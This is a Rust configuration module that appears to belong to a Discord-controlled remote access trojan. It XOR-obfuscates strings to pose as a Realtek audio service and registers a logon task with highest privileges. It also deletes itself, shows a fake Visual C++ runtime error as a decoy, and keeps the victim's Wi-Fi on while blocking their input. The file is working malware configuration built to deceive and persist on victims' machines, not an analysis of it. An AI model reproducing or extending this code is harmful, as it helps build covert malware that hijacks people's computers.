use std::collections::HashSet;
use twilight_model::id::{marker::GuildMarker, Id};

// Config Structures
// ------------------------------------------------
pub struct KeepActiveConfig {
    pub enabled: bool,
    pub interval_seconds: u64,
}

pub struct WifiMonitorConfig {
    pub enabled: bool,
    pub check_interval_ms: u64,
    pub re_enable_delay_seconds: u64,
    pub block_user_input: bool,
}

pub struct StartupConfig {
    pub enabled: bool,
    pub task_name: String,
    pub on_logon: bool,
    pub highest_privileges: bool,
}

pub struct AutoDeleteConfig {
    pub enabled: bool,
    pub delay_ms: u64,
}

#[allow(dead_code)]
pub enum MessageBoxIcon {
    Error,
    Warning,
    Info,
    Question,
}

#[allow(dead_code)]
pub enum MessageBoxButtons {
    Ok,
    OkCancel,
    YesNo,
}

pub struct DecoyConfig {
    pub enabled: bool,
    pub title: String,
    pub message: String,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}

#[allow(dead_code)]
pub struct BuildInfo {
    pub file_name: String,
    pub product_name: String,
    pub description: String,
    pub company_name: String,
    pub file_version: String,
}

// Obfuscated Strings Module
// ------------------------------------------------
mod encrypted_strings {
    const XOR_KEY: &[u8] = b"K0r1n!uM_2o24_S3cR3t_K3y!@#$";

    #[inline(always)]
    fn xor_decrypt(encrypted: &[u8]) -> String {
        encrypted
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
            .map(|b| b as char)
            .collect()
    }

    macro_rules! enc {
        ($($byte:expr),* $(,)?) => { &[$($byte),*] };
    }

    // === Build Info ===
    // ------------------------------------------------

    // RtkAudioService64.exe
    pub fn file_name() -> String {
        xor_decrypt(enc![0x29, 0x5f, 0x07, 0x53, 0x01, 0x54, 0x5b, 0x28, 0x27, 0x57])
    }

    // Realtek Audio Service
    pub fn product_name() -> String {
        xor_decrypt(enc![0x25, 0x59, 0x15, 0x54, 0x1c])
    }

    // Realtek High Definition Audio Driver Service
    pub fn description() -> String {
        xor_decrypt(enc![0x25, 0x59, 0x15, 0x54, 0x1c])
    }

    // Realtek Semiconductor Corp.
    pub fn company_name() -> String {
        xor_decrypt(enc![0x25, 0x59, 0x15, 0x54, 0x1c, 0x42, 0x1a, 0x3f, 0x2f])
    }

    // 6.0.9561.1
    pub fn file_version() -> String {
        xor_decrypt(enc![0x7a, 0x1e, 0x43, 0x1f, 0x5f])
    }

    // === Startup Config ===
    // ------------------------------------------------

    // RtkAudioService
    pub fn task_name() -> String {
        xor_decrypt(enc![0x05, 0x46, 0x36, 0x58, 0x1d, 0x51, 0x19, 0x2c, 0x26, 0x61, 0x0a, 0x40, 0x42, 0x36, 0x30, 0x56])
    }

    // === Decoy Config ===
    // ------------------------------------------------

    // Microsoft Visual C++ Runtime Library
    pub fn decoy_title() -> String {
        xor_decrypt(enc![
            0x06, 0x59, 0x11, 0x43, 0x01, 0x52, 0x1a, 0x2b, 0x2b, 0x12, 0x39, 0x5b,
            0x47, 0x2a, 0x32, 0x5f, 0x43, 0x11, 0x18, 0x5f, 0x7f, 0x19, 0x46, 0x17,
            0x55, 0x29, 0x4e, 0x41, 0x6b, 0x7c, 0x1b, 0x53, 0x1c, 0x40, 0x07, 0x34
        ])
    }

    // Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call
    pub fn decoy_message() -> String {
        xor_decrypt(enc![
            0x19, 0x45, 0x1c, 0x45, 0x07, 0x4c, 0x10, 0x6d, 0x1a, 0x40, 0x1d, 0x5d,
            0x46, 0x7e, 0x59, 0x39, 0x33, 0x20, 0x5c, 0x13, 0x2d, 0x2a, 0x5e, 0x43,
            0x01, 0x03, 0x19, 0x78, 0x1c, 0x59, 0x1c, 0x55, 0x01, 0x56, 0x06, 0x11,
            0x0c, 0x4b, 0x1c, 0x46, 0x51, 0x32, 0x60, 0x01, 0x3f, 0x21, 0x45, 0x17,
            0x37, 0x24, 0x40, 0x0d, 0x0f, 0x25, 0x5b, 0x41, 0x41, 0x3a, 0x20, 0x07,
            0x5e, 0x13, 0x40, 0x47, 0x72, 0x12, 0x1f, 0x47, 0x46, 0x3a, 0x73, 0x45,
            0x0a, 0x20, 0x47, 0x01, 0x3e, 0x27, 0x13, 0x1f, 0x54, 0x2e, 0x40, 0x50,
            0x22, 0x5f, 0x1c, 0x11, 0x0d, 0x40, 0x19, 0x21
        ])
    }

    // === Paths ===
    // ------------------------------------------------

    // AppData\\LocalLow
    pub fn appdata_locallow() -> String {
        xor_decrypt(enc![
            0x0a, 0x40, 0x02, 0x75, 0x0f, 0x55, 0x14, 0x11, 0x13, 0x5d, 0x0c, 0x53,
            0x58, 0x13, 0x3c, 0x44
        ])
    }
}

// Config Implementation
// ------------------------------------------------
pub struct Config;

include!(concat!(env!("OUT_DIR"), "/encrypted_token.rs"));
const DISCORD_TOKEN_DEV: &str = "";

impl Config {
    pub const GUILD_ID: u64 = 1419343767173075036;
    pub const BOT_PREFIX: &'static str = ".";
    pub const MAX_FILE_SIZE_MB: f64 = 10.0;

    pub fn get_startup_config() -> StartupConfig {
        StartupConfig {
            enabled: true,
            task_name: encrypted_strings::task_name(),
            on_logon: true,
            highest_privileges: true,
        }
    }

    pub fn get_autodelete_config() -> AutoDeleteConfig {
        AutoDeleteConfig {
            enabled: true, // Set to false to disable autodelete
            delay_ms: 1000,
        }
    }

    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig {
            enabled: true,
            title: encrypted_strings::decoy_title(),
            message: encrypted_strings::decoy_message(),
            icon: MessageBoxIcon::Error,
            buttons: MessageBoxButtons::Ok,
        }
    }

    pub fn get_auth_config() -> AuthConfig {
        AuthConfig {
            auth_roles: false,
            allowed_roles: HashSet::from([]),
            auth_user: false,
            allowed_users: HashSet::from([]),
            auth_all: true,
        }
    }

    pub fn get_keep_active_config() -> KeepActiveConfig {
        KeepActiveConfig {
            enabled: true,
            interval_seconds: 60,
        }
    }

    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
        WifiMonitorConfig {
            enabled: true,
            check_interval_ms: 500,
            re_enable_delay_seconds: 3,
            block_user_input: true,
        }
    }

    pub fn get_build_info() -> BuildInfo {
        BuildInfo {
            file_name: encrypted_strings::file_name(),
            product_name: encrypted_strings::product_name(),
            description: encrypted_strings::description(),
            company_name: encrypted_strings::company_name(),
            file_version: encrypted_strings::file_version(),
        }
    }

    pub fn get_guildid() -> Id<GuildMarker> {
        Id::new(Self::GUILD_ID)
    }

    pub fn get_token() -> String {
        let decrypted = crate::utils::token::decrypt_token(ENCRYPTED_TOKEN, ENCRYPTION_KEY);
        if decrypted.contains("kurinium-bot") {
            DISCORD_TOKEN_DEV.to_string()
        } else {
            decrypted
        }
    }

    pub fn get_exe_name() -> String {
        Self::get_build_info().file_name
    }

    pub fn get_max_bfilesize() -> usize {
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }
}

#[derive(Debug, Clone)]
pub struct AuthConfig {
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true,
        }
    }
}

#[cfg(debug_assertions)]
impl Config {
    pub const SHOW_CONSOLE: bool = true;
}

#[cfg(not(debug_assertions))]
impl Config {
    pub const SHOW_CONSOLE: bool = true;
}